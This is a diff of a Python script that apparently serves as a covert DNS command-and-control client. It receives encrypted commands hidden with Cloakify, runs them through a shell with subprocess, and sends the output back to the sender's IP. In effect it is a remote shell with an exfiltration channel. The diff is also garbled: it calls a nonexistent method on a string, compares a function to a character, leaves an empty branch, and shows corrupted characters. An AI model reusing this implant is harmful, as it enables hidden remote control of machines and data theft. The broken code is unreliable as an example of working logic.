@@ -2,7 +2,7 @@ import subprocess
 import os
 import argparse
 import time
-from dns_server import start_udp_server
+from dns_server import *
 import requests
 from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
@@ -52,7 +52,7 @@ def receive_command(local=False, args=None):
     if os.environ.get('EOT') == 'True' or local:
         def timeout_handler():
             print("No command received within 3 seconds. Requesting re-transmission.")
-            send_response('�', srcIp, args)
+            send_response('�'.do, srcIp, args)
             receive_command(local, args)
         timer = threading.Timer(3.0, timeout_handler)
         timer.start()
@@ -68,7 +68,7 @@ def receive_command(local=False, args=None):
         # Decloakify the command
         print("Decloakifying...")
         if Decloakify(cloaked_command, cipher, decloaked_command) == -1:
-            print("Requesting re-trasmission")
+            print("Requesting full re-trasmission")
             send_response('�', srcIp, args)
             open('cloaked.payload', 'w').close()
             receive_command(local, args)
@@ -85,10 +85,16 @@ def receive_command(local=False, args=None):
             encrypted_command = file.read().strip()
 
         command = decrypt_message(encrypted_command, key) if args is not None and args.encrypt else encrypted_command
-        if (command == '�'):
+        if (command != '�'):
             send_response(subprocess.check_output(command, shell=True).decode('utf-8'), srcIp, args)
-        print('received command: '+ command)
-        
+            print('received command: '+ command)
+        elif receive_command == '�':
+            send_response(command, args=args)
+        elif command.startswith('�') and command[1:].isdigit():
+            # appendi domini
+    
+
+
         # Execute the command
         try:
             # Send response of the execution
